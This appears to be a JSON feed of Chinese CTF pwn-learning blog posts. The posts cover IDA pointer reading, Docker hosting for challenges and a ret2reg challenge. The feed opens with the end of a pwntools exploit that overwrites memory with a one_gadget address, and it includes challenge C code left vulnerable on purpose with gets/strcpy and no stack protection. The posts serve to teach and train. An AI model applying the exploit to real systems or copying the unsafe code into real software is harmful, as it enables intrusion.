class=\"comment\">#add(0,0xf0,0xf0)</span></span><br><span class=\"line\">addr=libcbase+<span class=\"number\">0x219098</span></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,<span class=\"number\">0x222</span>,<span class=\"string\">&#x27;\\x08\\x01&#x27;</span>*<span class=\"number\">4</span>+p64(addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system=libcbase+libc.sym[&#x27;/bin/sh\\x00&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\">one=libcbase+<span class=\"number\">0xebcf8</span></span><br><span class=\"line\">drow(-<span class=\"number\">5</span>,p64(one))</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-41-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E9%92%88%E8%AF%86%E5%88%AB/",
            "title": "pwn入门-41-常见的指针识别",
            "date_published": "2023-09-28T09:26:19.000Z",
            "content_html": "<p>​\t在做题的时候, ida中很多指针看不懂,就很尴尬,需要再好好学习下, 不过还是多积累,遇到题目的时候每次都进行分析,后面就都慢慢熟悉了,(相应的可以根据反汇编代码写源代码,从开发、正向的角度来看)</p>\n<h3 id=\"以一道题目为例子-学习下指针等\"><a href=\"#以一道题目为例子-学习下指针等\" class=\"headerlink\" title=\"以一道题目为例子,学习下指针等\"></a>以一道题目为例子,学习下指针等</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">add_canvas</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+14h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  idx = read_idx();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( canvas[idx] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid index&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    canvas[idx] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>uLL); </span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter canvas width (1-255): &quot;</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%hhd&quot;</span>, &amp;v2);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter canvas height (1-255): &quot;</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%hhd&quot;</span>, &amp;v3);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v2 * v3) &lt;= <span class=\"number\">0xFF</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = canvas[idx]; <span class=\"comment\">//v0获取canvas画布的堆块的地址,</span></span><br><span class=\"line\">      *(_QWORD *)(v0 + <span class=\"number\">8</span>) = <span class=\"built_in\">malloc</span>((<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v2 * v3 + <span class=\"number\">1</span>));</span><br><span class=\"line\">        <span class=\"comment\">//v0+8,然后强制类型转换,再解引用,</span></span><br><span class=\"line\">        <span class=\"comment\">//_QWORD 64位    word</span></span><br><span class=\"line\">      *(_BYTE *)canvas[idx] = v2; <span class=\"comment\">// canvas这里也是QWORD类型(其实可以统一替换成v0的</span></span><br><span class=\"line\">      *(_BYTE *)(canvas[idx] + <span class=\"number\">1LL</span>) = v3;<span class=\"comment\">// 所以+1 是+1 byte</span></span><br><span class=\"line\">      *(_DWORD *)(canvas[idx] + <span class=\"number\">16LL</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">      *(_QWORD *)(canvas[idx] + <span class=\"number\">24LL</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too big&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)canvas[idx]);</span><br><span class=\"line\">      canvas[idx] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v5 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>chatgpt</p>\n<p>在 IDA Pro 中，”_DWORD”、”_QWORD”、”_BYTE” 等标识符通常表示不同的数据类型或数据大小，用于帮助分析和标识反汇编代码中的数据。这些标识符通常与数据类型的大小有关，以下是它们的一般含义：</p>\n<ol>\n<li>“_DWORD”：代表一个32位的双字（Double Word），通常对应于一个32位整数。在汇编和反汇编中，双字通常由4个字节组成。</li>\n<li>“_QWORD”：代表一个64位的四字（Quad Word），通常对应于一个64位整数。在汇编和反汇编中，四字通常由8个字节组成。</li>\n<li>“_BYTE”：代表一个8位的字节（Byte），通常对应于一个字节。在汇编和反汇编中，字节通常由一个字节组成，用于表示较小的数据。</li>\n<li>字是16位(历史原因、兼容原因……….)</li>\n</ol>\n<p>画堆块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+---------+----------+--------------------+</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">|                    |    chunk head      |</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">+---------+----------+-----------------+--+</span><br><span class=\"line\">+---------+----------+--------------------+</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">|          v3   v2   | v0+<span class=\"number\">8</span> <span class=\"built_in\">malloc</span> canvas |</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">+---------+----------+-----------------+--+</span><br><span class=\"line\"> +---------+----------+--------------------+</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">|                    |                 |</span><br><span class=\"line\">|                    |                    |</span><br><span class=\"line\">+---------+----------+-----------------+--+</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"> 画布</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">draw</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  idx = read_idx();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !canvas[idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid index&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Enter your picture (`width` chars in `height` lines): &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = *(<span class=\"type\">unsigned</span> __int8 *)(canvas[idx] + <span class=\"number\">1LL</span>); <span class=\"comment\">//height</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt;= result )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    read( <span class=\"comment\">//画一行 width</span></span><br><span class=\"line\">      <span class=\"number\">0</span>,</span><br><span class=\"line\">      (<span class=\"type\">void</span> *)(*(_QWORD *)(canvas[idx] + <span class=\"number\">8LL</span>) + i * *(<span class=\"type\">unsigned</span> __int8 *)canvas[idx]),</span><br><span class=\"line\">      *(<span class=\"type\">unsigned</span> __int8 *)canvas[idx] + <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;<span class=\"comment\">// *(_QWORD *)(canvas[idx] + 8LL) 是画布的地址,</span></span><br><span class=\"line\">    <span class=\"comment\">//i * *(unsigned __int8 *)canvas[idx] 是i * 宽</span></span><br><span class=\"line\">    <span class=\"comment\">//*(unsigned __int8 *)canvas[idx] + 1 是先取了宽,然后+1,</span></span><br><span class=\"line\">    <span class=\"comment\">// 所以输入0 8 1 的话,就是读入一行,读入9个字符(包括结束符号)</span></span><br><span class=\"line\">    <span class=\"comment\">// 读入地址就是开头呀</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>0 8 1</p>\n<p>结束符号EOF包括\\n \\0?</p>\n<p><strong>函数名</strong>：read</p>\n<p><strong>头文件</strong>：&lt;io.h&gt;</p>\n<p><strong>函数原型</strong>： int read(int handle,void *buf,int len);</p>\n<p><strong>功能</strong>：用于读取打开文件的内容</p>\n<p><strong>参数</strong>：int handle 为要读取的文件</p>\n<p>​     void *buf 为要将读取的内容保存的缓冲区</p>\n<p>​     int len  读取文件的长度</p>\n<p><strong>返回值</strong>：返回实际读取的字节数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *canvas[<span class=\"number\">5</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span> *str;</span><br><span class=\"line\">    <span class=\"type\">int</span> addr;</span><br><span class=\"line\">    canvas[<span class=\"number\">0</span>] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>);</span><br><span class=\"line\">    addr = canvas[<span class=\"number\">0</span>];</span><br><span class=\"line\">    addr = <span class=\"number\">1</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>指针和long int存储的有区别吗? 有区别的,</p>\n<p>如果是long int的话</p>\n<p>*(uintptr_t *)(x+8) &#x3D; malloc(0x30); 先把地址+8,然后强制类型转换成指针,然后解引用</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/",
            "title": "pwn入门-39-docker入门及pwn出题环境搭建",
            "date_published": "2023-09-16T05:30:16.000Z",
            "content_html": "<h1 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h1><p>入门参考资料:<a href=\"https://www.runoob.com/docker\">https://www.runoob.com/docker</a></p>\n<p><a href=\"https://yeasy.gitbook.io/docker_practice/\">https://yeasy.gitbook.io/docker_practice/</a></p>\n<h2 id=\"一、安装\"><a href=\"#一、安装\" class=\"headerlink\" title=\"一、安装\"></a>一、安装</h2><p>使用官方脚本安装docker</p>\n<p>curl -fsSL <a href=\"https://get.docker.com/\">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p>\n<p>手动安装(不如脚本稳定少出错)</p>\n<p>开启docker </p>\n<p>systemctl enable docker </p>\n<p>systemctl start docker</p>\n<p>测试是否安装成功: docker run –rm hello-world</p>\n<p>hello-world是测试容器, –rm表示退出容器后,自动删除容器</p>\n<h2 id=\"二、使用入门\"><a href=\"#二、使用入门\" class=\"headerlink\" title=\"二、使用入门\"></a>二、使用入门</h2><h3 id=\"1-镜像\"><a href=\"#1-镜像\" class=\"headerlink\" title=\"1.镜像\"></a>1.镜像</h3><ul>\n<li><p>docker images 查看本地镜像</p>\n</li>\n<li><p>docker pull xxxx 拉去镜像, 例如docker pull ubuntu:18.04</p>\n</li>\n</ul>\n<p>​\t\t不给镜像仓库地址的话, 会从 Docker Hub （<code>docker.io</code>）获取镜像, 而镜像名称是 <code>ubuntu:18.04</code>，因此将会获取官方镜像 <code>library/ubuntu</code> 仓库中标签为 <code>18.04</code> 的镜像。<code>docker pull</code>命令的输出结果最后一行给出了镜像的完整名称，例如： <code>docker.io/library/ubuntu:18.04</code>。</p>\n<ul>\n<li><p>docker rmi xxxx  删除镜像</p>\n</li>\n<li><p>docker build -t xxxx .  用dockerfile构建镜像</p>\n</li>\n</ul>\n<h3 id=\"2-容器\"><a href=\"#2-容器\" class=\"headerlink\" title=\"2.容器\"></a>2.容器</h3><ul>\n<li><p>docker ps 查看容器 -a查看所有(包括停止的)</p>\n</li>\n<li><p>docker run -it ubuntu:18.04 bash</p>\n</li>\n</ul>\n<p>​\t-it: -i 交互式操作 -t 终端 </p>\n<p>​\tbash 命令,希望有交互式shell,所以用这个,或者&#x2F;bin&#x2F;sh之类的</p>\n<ul>\n<li>docker stop xxx  停止容器</li>\n</ul>\n<h1 id=\"CTF-pwn出题环境搭建\"><a href=\"#CTF-pwn出题环境搭建\" class=\"headerlink\" title=\"CTF-pwn出题环境搭建\"></a>CTF-pwn出题环境搭建</h1><p>​\t\tpwn出题主要用到了 <a href=\"https://github.com/Eadom/ctf_xinetd\">https://github.com/Eadom/ctf_xinetd</a></p>\n<p>环境搭建</p>\n<p><a href=\"https://blog.csdn.net/weixin_53757397/article/details/128489015\">https://blog.csdn.net/weixin_53757397/article/details/128489015</a></p>\n<p><a href=\"https://blog.csdn.net/mylyylmy/article/details/79917776\">https://blog.csdn.net/mylyylmy/article/details/79917776</a></p>\n<p><a href=\"https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/\">https://nocbtm.github.io/2019/09/25/pwn题的搭建/</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_53757397/article/details/128489015\">https://blog.csdn.net/weixin_53757397/article/details/128489015</a> 感觉有点啰嗦,不一定需要上传docker仓库</p>\n<p><a href=\"https://blog.csdn.net/weixin_46521144/article/details/120572274\">https://blog.csdn.net/weixin_46521144/article/details/120572274</a> 排错</p>\n<h2 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h2><p>git clone <a href=\"https://github.com/Eadom/ctf_xinetd.git\">https://github.com/Eadom/ctf_xinetd.git</a></p>\n<ol>\n<li>将编译好的libc、flag、题目文件拷贝到bin目录下</li>\n</ol>\n<p>​\t\t如果需要特定的libc</p>\n<p>​\t\t提前patchelf好,把libc文件页拷贝到ctf_xinetd的bin目录下</p>\n<p>​\t\tpatchelf –set-interpreter .&#x2F;2.31-0ubuntu9_amd64&#x2F;ld-linux-x86-64.so.2 .&#x2F;timu<br>​\t\tpatchelf –set-rpath .&#x2F;2.31-0ubuntu9_amd64&#x2F; .&#x2F;timu</p>\n<p>​\t\t用绝对路径不知道为什么不行????</p>\n<ol start=\"2\">\n<li>创建docker-compose.yml文件,这里的3389改成题目要映射的端口(物理机的),9999是docker里面的端口,image名字要和后面创建的docker images名字一样</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &#x27;3&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">    pwn:</span><br><span class=\"line\">        build: ./</span><br><span class=\"line\">        image: pwn1 #这里修改的是images名,将和 docker build -t &quot;pwn1&quot; . 该命令有关</span><br><span class=\"line\">        ports:</span><br><span class=\"line\">            - &quot;3389:9999&quot;</span><br><span class=\"line\">        pids_limit: 1024</span><br><span class=\"line\">        # cpus: 0.5</span><br><span class=\"line\">        restart: unless-stopped</span><br><span class=\"line\">        # privileged: true</span><br></pre></td></tr></table></figure>\n\n<p>Dockerfile</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM ubuntu:<span class=\"number\">22.04</span> 根据情况修改版本</span><br><span class=\"line\">  </span><br><span class=\"line\">RUN cp -R /lib* /home/ctf &amp;&amp;\\  版本高于<span class=\"number\">18.04</span>要删除这一句??为啥呢??</span><br><span class=\"line\">  \tcp -R /usr/lib* /home/ctf </span><br></pre></td></tr></table></figure>\n\n\n\n<p>ctf.xinetd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service ctf</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    disable = no</span><br><span class=\"line\">    socket_type = stream</span><br><span class=\"line\">    protocol    = tcp</span><br><span class=\"line\">    wait        = no</span><br><span class=\"line\">    user        = root</span><br><span class=\"line\">    type        = UNLISTED</span><br><span class=\"line\">    port        = <span class=\"number\">9999</span></span><br><span class=\"line\">    bind        = <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span></span><br><span class=\"line\">    server      = /usr/sbin/chroot</span><br><span class=\"line\">    <span class=\"meta\"># replace helloworld to your program</span></span><br><span class=\"line\">    server_args = --userspec=<span class=\"number\">1000</span>:<span class=\"number\">1000</span> /home/ctf ./timu   这里timu是题目bin文件名</span><br><span class=\"line\">    banner_fail = /etc/banner_fail</span><br><span class=\"line\">    <span class=\"meta\"># safety options</span></span><br><span class=\"line\">    per_source\t= <span class=\"number\">10</span> <span class=\"meta\"># the maximum instances of this service per source IP address</span></span><br><span class=\"line\">    rlimit_cpu\t= <span class=\"number\">20</span> <span class=\"meta\"># the maximum number of CPU seconds that the service may use</span></span><br><span class=\"line\">    #rlimit_as  = <span class=\"number\">1024</span>M <span class=\"meta\"># the Address Space resource limit for the service</span></span><br><span class=\"line\">    #access_times = <span class=\"number\">2</span>:<span class=\"number\">00</span><span class=\"number\">-9</span>:<span class=\"number\">00</span> <span class=\"number\">12</span>:<span class=\"number\">00</span><span class=\"number\">-24</span>:<span class=\"number\">00</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>制作镜像</li>\n</ol>\n<p>​\t\t建立容器,pwn1名字就是镜像的名字</p>\n<figure class=\"highlight erlang\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t <span class=\"string\">&quot;pwn1&quot;</span> .</span><br></pre></td></tr></table></figure>\n\n\n\n<p>4.创建运行容器</p>\n<p>​\t\tdocker run -d -p 0.0.0.0:3389:9999 pwn1 运行容器,这里就部署好了,可以进行打了,3389是暴露出来的端口</p>\n<p>​\t\tdocker exec -it 16a224caf905 &#x2F;bin&#x2F;bash  和容器进行交互,(这个是退出后再次进入,和run时候-it不一样)</p>\n<p>文件拷贝 <a href=\"https://blog.csdn.net/sunhuaqiang1/article/details/88354410\">https://blog.csdn.net/sunhuaqiang1/article/details/88354410</a></p>\n<p>docker cp &#x2F;root&#x2F;chuti&#x2F;uaf&#x2F;timu pwncp:&#x2F;home&#x2F;ctf&#x2F;timu</p>\n<p><a href=\"https://blog.csdn.net/yue7603835/article/details/122456650\">https://blog.csdn.net/yue7603835/article/details/122456650</a></p>\n",
            "tags": [
                "PWN入门",
                "docker"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/",
            "title": "pwn入门-38-月赛出题3道",
            "date_published": "2023-09-16T05:23:18.000Z",
            "content_html": "<p>​\t\t例行月赛出题，出了三道，两道是基于自己做过的题，融合了其他知识点（缝缝补补又一年），还有一道是临时出的凑数的。感觉确实不仅需要做题，也需要出题，出题的时候才能更好地理解出题人的想法（废话。。），以及注意到之前的很多细节。</p>\n<p>​\t\t这次也踩坑踩了很多，比如条件竞争的题目，不知道怎么部署。。。想了很多方案都不行。以及docker容器自身的问题，它只是隔离了进程，并没有用新的内核，所以一些内核特性用不了。</p>\n<h1 id=\"ret2reg\"><a href=\"#ret2reg\" class=\"headerlink\" title=\"ret2reg\"></a>ret2reg</h1><h2 id=\"题目源码\"><a href=\"#题目源码\" class=\"headerlink\" title=\"题目源码\"></a>题目源码</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">evilfunction</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> buffer[<span class=\"number\">512</span>];    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer, input);    </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> input[<span class=\"number\">580</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;welcome to here,please give me something&quot;</span>);</span><br><span class=\"line\">    gets(input);</span><br><span class=\"line\">    evilfunction(input);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>​\t\t本身这道题的原题是没有开启随机化，相对比较简单，可以直接写shellcode，然后call eax这种过去执行shellcode，但是如果开了随机化，call eax的地址就不确定了，<font color=\"red\">但是可以进行枚举，（之前一直不会写枚举的脚本，这次学会了。。。）感觉之前有时候也是成功了,但是没有正确停止或打印</font></p>\n<p>​\t\tPIE和ALSR:</p>\n<p>ALSR:&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spac  完全开启时 栈、堆、libc变化,程序本身及PLT不变</p>\n<p>PIE:可执行程序的加载基址</p>\n<p>​\t\t在作者那个年代,应该是默认不开启PIE的,现在都是默认开启… 不开启的话,就很容易了,alsr不影响,所以做的时候有点怪怪的…</p>\n<pre><code>gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector -no-pie\n</code></pre>\n<p>objdump -d ret2reg</p>\n<p>804901d</p>\n<p><img 